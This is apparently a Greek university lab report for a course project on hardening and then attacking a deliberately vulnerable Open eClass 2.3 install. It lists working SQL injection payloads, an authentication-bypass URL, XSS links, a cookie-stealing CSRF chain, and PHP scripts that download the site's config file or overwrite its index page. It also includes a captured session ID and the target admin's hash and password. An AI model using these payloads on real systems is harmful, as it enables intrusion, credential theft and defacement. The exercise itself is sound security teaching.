## Open eClass 2.3

Το repository αυτό περιέχει μια __παλιά και μη ασφαλή__ έκδοση του eclass.
Προορίζεται για χρήση στα πλαίσια του μαθήματος
[Προστασία & Ασφάλεια Υπολογιστικών Συστημάτων (ΥΣ13)](https://ys13.chatzi.org/), __μην τη
χρησιμοποιήσετε για κάνενα άλλο σκοπό__.


### Χρήση μέσω docker
```
# create and start (the first run takes time to build the image)
docker-compose up -d

# stop/restart
docker-compose stop
docker-compose start

# stop and remove
docker-compose down -v
```

To site είναι διαθέσιμο στο http://localhost:8001/. Την πρώτη φορά θα πρέπει να τρέξετε τον οδηγό εγκατάστασης.


### Ρυθμίσεις eclass

Στο οδηγό εγκατάστασης του eclass, χρησιμοποιήστε __οπωσδήποτε__ τις παρακάτω ρυθμίσεις:

- Ρυθμίσεις της MySQL
  - Εξυπηρέτης Βάσης Δεδομένων: `db`
  - Όνομα Χρήστη για τη Βάση Δεδομένων: `root`
  - Συνθηματικό για τη Βάση Δεδομένων: `1234`
- Ρυθμίσεις συστήματος
  - URL του Open eClass : `http://localhost:8001/` (προσοχή στο τελικό `/`)
  - Όνομα Χρήστη του Διαχειριστή : `drunkadmin`

Αν κάνετε κάποιο λάθος στις ρυθμίσεις, ή για οποιοδήποτε λόγο θέλετε να ρυθμίσετε
το openeclass από την αρχή, διαγράψτε το directory, `openeclass/config` και ο
οδηγός εγκατάστασης θα τρέξει ξανά.

## 2023 Project 1

Εκφώνηση: https://ys13.chatzi.org/assets/projects/project1.pdf


### Μέλη ομάδας

- 1900041, Ιάσονας Γιώτης
- 1900070, Άγγελος Καμάρης

### Report

### Πρώτο Κομμάτι - Άμυνα

- SQL INJECTIONS:

  Στο αρχικό site για την προστασία από sql injections, υπάρχει το φίλτρο ``` mysql_real_escape_string ```. Δεν καταφέραμε να βρούμε τρόπο να σπάσουμε αυτήν την άμυνα καθώς η ίδια η 
sql στην αρχή χρησιμοποιεί ``` mysql_query('SET NAMES utf8'); ``` κάτι το οποίο την καθιστά ασφαλή καθώς δεν έχει ευάλωτους χαρακτήρες, (όπως θα είχε η gbk π.χ). Παρόλα αυτά υπάρχουν σελίδες που τα inputs δεν φιλτράρονται. Μερικά παραδείγματα είναι κατά την δημιουργία και την επεξεργασία στοιχείων μαθητή, ενώ τα πεδία username και password, φιλτράρονται, τα υπόλοιπα (email, name, prename, am) δεν φιλτράρονται , (στο am δεν ελέγχεται καν αν θα μπει αριθμός). Με αυτόν τον τρόπο κάποιος μπορεί να βάλει: ``` ', prenom = (SELECT pass FROM (SELECT password as pass FROM user WHERE user_id = 1) AS p), --  ```, στο επώνυμο, και να αποθηκευτεί έτσι στο όνομα ο κωδικός του admin. Αντιστοίχως ευάλωτα είναι και τα περισσότερα πεδία στην περιοχή συζητήσεων, καθώς αν στα url των σελιδων viewtopic, newtopic και reply, καθώς βάζοντας sql injections στην μεταβλητή topic ή forum, για το newtopic, θα εμφανιστεί στα breadcrumps, ή στον τίτλο, το hash του κωδικού του admin. (π.χ. το: ``` topic=1)and 1=0 union select 1,password from eclass.user where user_id=1 --   ```[το topic δεν τσεκάρει αν εισάγετε αριθμός]), στο viewtopic, μας δίνει τον κωδικό του admin. Στο ανέβασμα αρχείων, ένα αρχείο με το όνομα: ``` ', (SELECT password FROM eclass.user WHERE user_id = '1')); -- '``` , θα πάρουμε το hash του admin, στα σχόλια της εργασίας. Τέλος κατά την απεγγραφή από το μάθημα  υπάρχει η μεταβλητή cid στο url, η οποία μπορεί να μας γυρίσει το hash του admin. Υπάρχουν και επιθέσεις σε σελίδες που αφορούν τον admin, σε αυτές θα αναφερθούμε στα csrf.

  Για την καταπολέμηση των από πάνω προβλημάτων, έβαλα prepared statements σε όσες περισσότερες σελίδες μπορούσα, ασχέτως αν είχαν ήδη φίλτρο ή όχι, χρησιμοποιόντας ``` mysqli ```, σε σελίδες που μπορούσε να χρησιμοποιηθεί, αλλιώς έβαζα φίλτρο στις υπόλοιπες (ακόμα και σε σελίδες που δεν μπορούσα να κάνω επίθεση). Άλλο ένα λάθος που βρήκα ήταν ότι για να τρέξει η sql, καλούνταν η συνάρτηση db_query, η οποία σε περίπτωση λάθους εκτύπωνε το αποτέλεσμα του query, κάτι το οποίο δεν επιτρέπω. Τέλος σε μεταβλητές που εισάγωνται ως αριθμητικό ποσό, αλλά δεν ελέγχονται, βάζω να εισάγεται string, ώστε με το φίλτρο να καταπολεμάται το πρόβλημα των επιθέσεων.


- CSRF ATTACKS:
 
  Η ιστοσελίδα που μας δόθηκε, δεν είχε σε κανένα κομμάτι προστασία από csrf attacks. Όχι μόνο αυτό αλλά δεν έκανε και την καλύτερη χρήση post και get, για την αποφυγή τέτοιων επιθέσεων (π.χ. η διαγραφή χρήστη γίνεται με get, όπου στο url απλά προσθέτεται μια ένδειξη για την διαγραφη και το id του χρήστη). Αυτό είχε σαν αποτέλεσμα να μπορούν να γίνουν πολλές επιθέσεις csrf, ενδεικτικά θα αναφέρω μερικές που βρήκα εγώ επικίνδυνες: Διαγραφή χρήστη, Χρήση Admin, δημιουργία μαθήματος, δημιουργία forum και topic, αλλαγή των δεδομένων της βάσης, αλλαγή στοιχείων χρήστη, απεγγραφή χρήστη από το μάθημα, αλλαγή κωδικού χρήστη, κατέβασμα αρχείων και άλλα παρόμοια με αυτά. Πέρα όμως από αυτά τα προβλήματα υπήρχαν και 2 περιπτώσεις που το csrf, σε συνδιασμό με sqli injections, μπορούσε να εμφανίσει τον κωδικό του admin, στις σελίδες forum_admin και list_users. Στο πρώτο, βάζοντας στον Όνομα περιοχής συζητήσεων: ``` aaa' , (SELECT password FROM eclass.user WHERE user_id='1'), '2', '1', '5', '');--  ```, θα εμφανιστεί στα σχόλια αυτής της περιοχής το hash του κωδικού του admin, ενώ στο δεύτερο, από την σελίδα /modules/admin/search_user.php, αν κάποιος βάλει το: ``` ' union select password, password, password, password, password, password from eclass.user where user_id=1--  ```, στο επώνυμο ή πατηθεί το link: ``` http://localhost:8001/modules/admin/listusers.php?user_surname=%27%20%20union%20select%20password,%20password,password,password,password,password%20from%20eclass.user%20where%20user_id=1--+&search_submit=%CE%91%CE%BD%CE%B1%CE%B6%CE%AE%CF%84%CE%B7%CF%83%CE%B7 ```, θα φανούν στην σελίδα σε όλα τα πεδία αναζήτησης το hash του κωδικού του admin. Πέρα από αυτά σε αυτές τις σελίδες αλλά και σε άλλες με παρόμοιο τρόπο μπορούν να γίνουν και xss attacks.
  
  Για την καταπολέμηση αυτού του θέματος, δημιούργησα το αρχείο:  ``` openeclass\include\csrf_func.php ```, το οποίο και κάνω include στο αρχείο ```openeclass\include\baseTheme.php ```, στην γραμμή 51, ώστε να είναι σε όλες μου τις σελίδες. Αυτό το αρχείο έχει 2 συναρτήσεις, την: makeToken(), η οποία ελέγχει αν υπάρχει ήδη token και αν δεν υπάρχει το δημιουργεί και το αποθηκεύει στο SESSION, και την:  checkToken(): η οποία ελέγχει αν υπάρχει token στο post ή στο request και είναι ίδιο με αυτό στο session αλλιώς σβήνει το token που υπάρχει αυτή την στιγμή στο session (σε περίπτωση που κάποιος το αντιγράψει) και εμφανίζει μύνημα λάθους στον χρήστη.
Αυτές οι 2 συναρτήσεις χρησιμοποιούνται στις φόρμες αλλά και σε μερικά urls, έτσι ώστε να βεβαιωθούμε ότι ο χρήστης που μπαίνει σε μια σελίδα, δεν μπαίνει με redirect. Αυτό το επιτυγχάνουμε στις φόρμες προσθέτοντας το token σαν hidden input, ενώ στα urls πρόσθεσα μια μεταβλητή σε αυτά που έχει το token. Τέλος κάτι επιπλέον που έκανα, σε περίπτωση που κάποιος αποπειραθεί να αντιγράψει το session id, έβαλα στο ``` openeclass\index.php ``` την παράμετρο στο cookie, να μην μπορεί να εμφανιστεί το document.cookie.
  
  
  
- XSS ATTACKS :

Γενικά στα περισσότερα σημεία που υπήρχε user input έπρεπε εφαρμοστούν φίλτρα διότι υπήρχαν αρκετά vulerabilities π.χ αν ο χρήστης διάλεγε να κάνει edit το profile του  και έβαζε στο surname <script> alert(1) </script> εμφανιζόταν μύνημα έπειτα απο την αλλαγή στοιχείων . Επίσης xss attacks γινόντουσαν και απο links  όπως : <br />

	http://localhost:8001/modules/profile/profile.php/"><script>alert(1)</script> <br />

	http://localhost:8001/modules/work/work.php?id='--<script>alert(1)</script> <br />

	http://localhost:8001/index.php/%27"/><script>alert(1)</script>  <br />

	http://localhost:8001/modules/phpbb/reply.php?topic=2&forum=1&message=<script>alert(1)</script>&submit=Yποβολή <br />

Και άλλα πολλά σε σχεδόν όποιο σημείο είχε user input που άλλαζε απο link . Αρκετά xss attacks είναι αρκετά παρόμοια και με αυτά που αναφέρονται στο csrf section

Για την ασφάλιση της ιστοσελίδας στον τομέα αυτό χρησημοποιήθηκε η συνάρτηση htmlentities που απαλοίφει τους χαρακτήρες
που μπορούν να χρησιμοποιηθούν για να εκτελέσουν κάποιο scrit στην σελίδα. Κάποια κομμάτια που χρειαζόντουσαν αρκετό patchaρισμα για xss attacks ηταν : profile.php , viewforum.php , work.php ,forum_admin.php ,Basetheme.php ,MessageList.php και άλλα . 

Πριν απο αυτές τις αλλαγές υπήρχαν μεταξύ άλλων κάποια απο τα παρακάτω attacks :

 O χρήστης έκανε edit το profile του και έβαζα Nom ή Prenom <scirpt> alert(1) </script>  <br />
 O χρήστης ανέβαζε εργασία και στην περιγραφή της έβαζε  <scirpt> alert(1) </script>  <br />
Ο χρήστης έστλενε μύνημα στην τηλεργασία  <scirpt> alert(1) </script>  <br />
Ο χρήστης μέσω της ανταλλαγής αρχείων έστελνε αρχείο στον admin και στην περιγραφή έβαζε <scirpt> alert(1) </script>  <br />
<br />

-Remote File injections : 

 Τα 3 βασικά μέρη που έκαναν το site ευάλωτο σε file injections ήταν : Oι εργασίες , Η ανταλαγή αρχείων , Τα μη προστατευμένα links του server . 
 Το site ήταν ευάλωτο στο εξής attack :
 Ανέβασμα εργασίας ή αρχείου για ανταλλαγή 
 Eύρεση path του αρχείου κάνοντας προσπέλαση σε Link όπως http://localhost:8001/include/ το οποίο μετέφερε τον χρήστη σε σελίδα που φενόταν το filesystem του   server . 
 Εκτέλεση του αρχείου απο το path.
 Το αρχείο ήταν ένα php αρχείο το οποίο είτε έκανε unlink το root με την χρήση της εντολής unlink είτε διάβαζε τα αρχεία ρυθμίσεων (γνωρίζοντας το path)    βλέποντας έτσι τον κωδικό της βάσης δεδομένων 

 Για να προστατευτόυμε απο τέτοιου είδους attacks έγιναν οι εξής αλλαγές .
 Τα αρχεία αποθηκεύονται στο filesystem σε zips και δίονται για download σε μορφή zip με την χρήση της προεγκατεστημένης στο vanilla eclass βιβλιοθήκης PCLZIP . (work.php ,dropbox_submit.php ,dropbox_download.php)

 Στον φάκελο cong στο 000-default.conf προσθέθηκε ο εξής κανόνας ο οποίος απαγορεύει την προβολή σελιδών του site χωρίς Index

 	<Directory /var/www/openeclass>

        Options -Indexes +FollowSymLinks

        AllowOverride None

        Require all granted

	</Directory>

  
- Γενικά : 

 Βάλαμε die() στις σελίδες του μαθήματος που δεν ήταν απαραίτητες όπως επίσης και σε σελίδες σαν το upgrade.php και το import.php. Είχαν θέματα csrf, sql injection, xss καθώς και μερικά rfi.
 
 ________________________________________________________________________________________________________________________________________________
 
 
 
### Δεύτερο Κομμάτι - Επίθεση

Oι παρακάτω επιθέσεις μας έδωσαν με επιτυχία το hash του admin  dbb5f25125ded0cd1d7e927409f8a1da αλλα και τον κωδικό του RPQjq6j4Sm




- SQL INJECTIONS:

Η ιστοσελίδα ήταν αρκετά προστατευμένη με prepared statements. Οι επιθέσεις που κάναμε ήταν:

/modules/profile/profile.php: Στο input επώνυμο:

``` ', prenom = (SELECT pass FROM (SELECT password as pass FROM user WHERE user_id = 1) AS p), -- - ```

Αποτυχία.

/modules/auth/newuser.php: Στο input επώνυμο:

``` ', (SELECT pass FROM (SELECT password as pass FROM user WHERE user_id = 1) AS p), 'evil2', '', '', '5', -- - ``` 

Αποτυχία.

/modules/work/work.php: Ανεβάσαμε αρχείο με το όνομα:

``` ', (SELECT password FROM eclass.user WHERE user_id = '1')); -- ' ```

Επιτυχία, πήραμε το hash που ήταν: dbb5f25125ded0cd1d7e927409f8a1da

στο url, με τα στοιχεία:

?id=1' union SELECT password from eclass.user where user_id='1' -- -

Επιτυχία, πήραμε μύνημα λάθους: Error: submission dbb5f25125ded0cd1d7e927409f8a1da doesn't exist.


/modules/phpbb/: Συμπλήρωσα στο url:

 viewtopic.php?topic=1)and 1=0 union select password,password from eclass.user where user_id=1-- -
 
 newtopic.php?forum=0') union select password as forum_name, password as forum_access, password as forum_id from eclass.user --%20
 
 reply.php?topic=1) and 1=0 union select password, password, password, password from eclass.user where user_id=1-- -

Αποτυχία

/modules/unreguser/unregcours.php?cid=0' union Select password as intitule From eclass.user where user_id='1&u=2

Αποτυχία

Γενικά φαίνεται να έχουν προστατέψει πολύ καλά τις σελίδες στις οποίες έχει πρόσβαση ο χρήστης και όχι μόνο, αλλά υπήρχαν σελίδες οι οποίες έπρεπε να είχαν απεωεργοποιηθεί.

Μια βασική σελίδα στην οποία δεν θα έπρεπε να έχει πρόσβαση ένας χρήστης είναι η: 

/upgrade/upgrade.php?login=' OR user.user_id='1' --

η οποία κάνει έναν έλεγχο αν ο τωρινός χρήστης έχει το όνομα, τον κωδικό και το id του admin, και αν ισχύει αυτό κάνει το session του χρήστη ο οποίος έχει
σωστά αυτά τα στοιχεία, το session του admin. με το login=' OR user.user_id='1' εμείς κάναμε την sql να επιστρέψει στον έλεγχο true, κάτι το οποίο μας έδωσε
διακαιώματα admin. Χάναμε τα διακιώματα κάθε φορά που άλλαζε το session.

Πέρα από αυτό όμως σε άλλες σελίδες, είναι προστατευμένο, π.χ.:

/modules/forum_admin/forum_admin.php?forumgo=yes&cat_id=2&ctg=Αρχή: στο όνομα περιοχής συζητήσεων:

``` ' , (SELECT password FROM eclass.user WHERE user_id='1'), '2', '1', '2', '');-- - ```

Αποτυχία

/modules/forum_admin/forum_admin.php?forumgoedit=yes&forum_id=4&ctg=Αρχή&cat_id=2: στο όνομα και μετά στην περιοχή:

``` ' WHERE id='2' -- - ```

``` ', description=(SELECT password from eclass.user where user_id=1), category='0 ```

Αποτυχία

η σελίδα: /modules/admin/listusers.php, αν και προστατευμένη από sql injections με post, όταν χρησιμοποιούμε το:

/modules/admin/listusers.php?user_surname=%27%20%20union%20select%20password,%20password,password,password,password,password%20from%20eclass.user%20where%20user_id=1--+&search_submit=%CE%91%CE%BD%CE%B1%CE%B6%CE%AE%CF%84%CE%B7%CF%83%CE%B7

Επιτυχία.βλέπουμε έναν χρήστη που έχει το hash του admin. 

!Υπάρχουν και άλλα sql injections σε λειτουργίες που δεν χρειάζονταν για το μάθημα (π.χ. στους συνδέσμους, τα οποία χρησιμοποιήσαμε στα csrf.

Σε γενικές γραμμές η ιστοσελίδα ήταν αρκετά προστατευμένη όσο αφορά τα sql injections, καθώς τα περισσότερα από αυτά είχαν αντιμετωπιστεί.



- CSRF:

στην εργασία υπάρχουν 3 csrf αρχεία, 2 εκ των οποίων τα στείλαμε στο email και το τελευταίο, αφού είχαμε δικαιώματα το δοκιμάσαμε οι ίδιοι.

1η επίθεση:

Δημιούργησα το αρχείο resume.php, το οποίο ήταν ένα ψεύτικο βιογραφικό, το οποίο είχε 6 "σελίδες". κάθε φορά που πατιούσε ο admin το κουμπί αλλαγή σελίδας,
γινόταν μια επίθεση. (5 στο σύνολο) Μαζί με κάθε επίθεση γραφόταν και στ αρχείο log.txt ποιά επίθεση έγινε.

1: άνοιγμα μαθήματος. Για την διεξαγωγή επιθέσεων πρέπει ο admin να έχει ανοίξει το μάθημα στο οποίο θα γίνει η επίθεση - Επιτυχία

2: δικαιώματα χρήστη. Δίναμε διακιώματα admin για το μάθημα στον χρήστη με id=3 - Αποτυχία

3: μετονομασία forum. Αλλάζαμε το όνομα του πρώτου topic, κάνοντας sql injection, ώστε να φαίνεται το hash του admin - Αποτυχία

4: δημιουργία link. Δημιουργούσαμε ένα link, το οποίο με sql injection θα εμφάνιζε το hash του admin - Επιτυχία

5: ενεργοποίηση εργαλείου. Ενεργοποιούσαμε το εργαλίο σύνδεσμος ώστε να μπορούν όλοι οι μαθητές να το χρησιμοποιήσουν - Αποτυχία

Αποτέλεσμα, μετά από την ολοκληρωμένη χρήση του resume.php, το log.txt θα εμφάνιζε:

```
Date: 12/5/2023, 1:10:11 π.μ. | Index: 1

Date: 12/5/2023, 1:10:18 π.μ. | Index: 2

Date: 12/5/2023, 1:10:24 π.μ. | Index: 3

Date: 12/5/2023, 1:10:33 π.μ. | Index: 4

Date: 12/5/2023, 1:10:41 π.μ. | Index: 5
```

Συμπέρασμα, οι περισσότερες επιθέσεις δεν πέτυχαν και το site είναι αρκετά προστατευμένο από απλές csrf επιθέσεις.

2η επίθεση:

Δημιούργησα το αρχείο user_probmlem.php, site.html και get_info.php. Το αρχείο user_problem.php έλεγχε αν το import.php, το οποίο επιτρέπει το ανέβασμα
σελίδων, έχει ασφαλιστεί από rfi. Συγκεκριμένα δημιούργησα μια σελίδα το site.html το οποίο κάνει redirect στην σελίδα get_info.php δίνοντας με post τα
cookies από την σελίδα site.html. στόχος είναι χρησιμοποιώντας το import.php να ανεβάσω την σελίδα site.php, στο μάθημα, και να κάνω τον χρήστη να δώσει το session id του, έτσι. Το get_info.php είναι ανεβασμένο στον φάκελο puppies μου και όταν δέχεται αίτημα post, αποθηκεύει τα cookies στο ses.txt. αυτό επιτυγχάνετε σε 3 βήματα κάθε link είναι και μια επίθεση, στο
αρχείο user_problems.php, όπου εμφανίζονται σαν links από έναν φοιτητή ο οποίος δείχνει στον admin μερικά προβλήματα που αντιμετωπίζει.

1: άνοιγμα μαθήματος. Για τον ίδιο λόγο με επάνω - Επιτυχία

2: δημιουργία σελίδας. Δημιουργία σελίδας site.html στο μάθημα - Επιτυχία

3: άνοιγμα σελίδας. Άνοιγμα σελίδας από τον admin -Αποτυχία (προστασία από rfi επιθέσεις)

αφού δεν ολοκληρώθηκε το βήμα 3, δεν γράφτηκε κάτι στο ses.txt, αλλά υπάρχει πλέον ένας σύνδεσμος στο μάθημα (press_me) ο οποίος όμως επειδή υπάρχει φίλτρο και μόνο
αρχεία με το όνομα index.php μπορούν να ανοίξουν, δεν λειτουργεί.

Συμπέρασμα, η ιστοσελίδα είναι ευάλωτη όσον αφορά το ανέβασμα αρχείων από το import.php.

3η επίθεση:

Η τρίτη επίθεση αποτελεί μια διόρθωση της δεύτερης καθώς η μόνη αλλαγή που έκανα ήταν να αλλάξω στο αρχείο το οποίο ανεβάζω το όνομα από site.html σε index.php. Η
αλλαγή φαίνεται στο αρχείο smurfs.php το οποίο είναι ένα αρχείο με την μορφή ενός κουιζ για το τι στρουμφάκι είσαι. Με κάθε οριστικοποίηση της απάντησης γίνεται επίθεση. 

Αποτέλεσμα, αφού το έτρεξα εγώ με δικαιώματα admin, έχω στο ses.txt:

```
Session id is:
_ga=GA1.2.1068528191.1614533799; __utma=178260854.1068528191.1614533799.1683579631.1683732267.10; __utmz=178260854.1677073052.6.5.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); PHPSESSID=ki8m4ajcakl0b146tbrfgvgj72
     -at: 22:19 11-05-2023
 ```
 
 Συμπέρασμα, έχω πλέον και το session του admin, μπορώ να μπω λοιπόν σαν admin, απλά βάζοντας το session μέσω της κονσόλας στο document.cookie.
 
 Σε γενική άποψη η σελίδα ήταν αρκετά προστατευμένη από csrf attacks. έχοντας πάρει δικαιώματα admin είδα ότι στις περισσότερες σελίδες δεν θα πετύχαιναν
 csrf attacks, καθώς οι μόνες ευάλωτες σελίδες ήταν αυτές στις οποίες ένας απλός χρήστης δεν θα είχε πρόσβαση στο μάθημα, αλλά και σε περίτωση επίθεσης,
 δεν υπήρχε τρόπος ενεργοποίησης του εργαλείου ώστε να παρατηρηθούν τα αποτελέσματα της επίθεσης.


- ΧSS attacks:

Δοκιμάσαμε αρκετά XSS attacks.Τα περισσότερα δεν δούλεψαν καθώς το site ήταν αρκετά προσεγμένο
 . Κάποια απο αυτά που δεν δούλεψαν είναι τα εξής :

 - μύνημα <script> alert(1) </script> στην τηλεσυνεργασία .
 - Δημιουργία χρήστη με όνομα ή/και επώνυμο ή/και email  <script> alert(1) </script>
 - Edit το profile του χρήστη και δοκιμή για  <script> alert(1) </script> σε οποιοδήποτε πεδίο το επέτρεπε
 - μύνημα στα topics  <script> alert(1) </script>
 - δημιουργία συζήτησης με όνομα και περιγραφή <script> alert(1) </script>

 Αντίστοιχα κάποιοα που δούλεψαν ήταν : 

- http://i-sn1ff-ch4tz1k0.csec.chatzi.org/index.php/%27"/><script>alert(1)</script>

- http://i-sn1ff-ch4tz1k0.csec.chatzi.org/modules/work/work.php?id='--<script>alert(1)</script>

- http://i-sn1ff-ch4tz1k0.csec.chatzi.org/modules/profile/profile.php/"><script>alert(1)</script>




- Remote File injections attacks :

Παρατηρήθηκε ότι το site της αντίπαλης ομάδας δεν άφηνει να γίνει diplay ο κατάλογος των αρχείων με  sitename/include  σε οποιονδήποτε κατάλογο δεν υπήρχε Index.
Έγιναν αρκετές δοκιμές να ανέβουν αρχεία index.php τόσο στις εργασίες όσο και στις ανταλαγές αρχείων χωρίς κανένα ουσιώδες αποτέλεσμα διότι ήταν πλήρως ασφαλισμένες .
Παρόλα αυτά βρέθηκε το εξής file injection :
Όντας συνδεμένοι με έναν user χρησιμοποιήσαμε το εξής Link : ```http://i-sn1ff-ch4tz1k0.csec.chatzi.org//upgrade/upgrade.php?login=' OR user.user_id='1' -- ```
Kαταφέραμε να πάρουμε δικαιώματα διαχειριστή στο μάθημα.
Έτσι στην ενεργοποίηση εργαλείων πατήσαμε στο ανέβασμα ιστοσελίδας και προσθέσαμε το εξής PHP αρχείο  με όνομα index.php

```
<?php
echo "hello there";

$file = '../../../config/config.php';

if(!file_exists($file)){ // file does not exist
    die('error');
} else {
    header("Cache-Control: public");
    header("Content-Description: File Transfer");
    header("Content-Disposition: attachment; filename=$file");
    header("Content-Type: application/x-httpd-php");
    header("Content-Transfer-Encoding: binary");

    // read the file from disk
    readfile($file);
}

?>
```

Έπειτα απλώς ανοίξαμε την ιστοσελίδα και έτσι κατέβηκε το αρχείο config.php απο την βάση του αντίπαλου site το οποίο μέσα περιέχει
τον κωδικό της βάσης και κατεπέκταση του drunk admin δίνοντας μας έτσι πλήρη πρόσβαση στην διαχείρηση του site αλλά και στο filesystem του.

Αλλαγή Αρχικής σελίδας  με file injection : 
Καθως δεν είχαμε δικαιώματα να γράψουμε  σε οποιοδήποτε αρχείο έπρεπε να βρούμε κάποιο workaround .
Συνεπώς δημιουργήσαμε αυτό php script το οποίο άλλαζε το index.php του site με το δικό μας  :

```
<?php
$file = '../../../index.php';
unlink($file);
$myfile = fopen($file, "w");
fclose($myfile);
if(copy('test.php', $file)){
    echo "<br>success!";
}
else{
    echo "<br>fail!";
}
?>
```

Έτσι ανεβάζοντας στις σελίδες το παραπάνω script με όνομα index.php και την δικιά μας αρχική σελίδα test.php είχαμε την δυνατότητα
να αλλάξουμε την αρχική σελίδα με την δικιά μας απλώς καλώντας το index.php
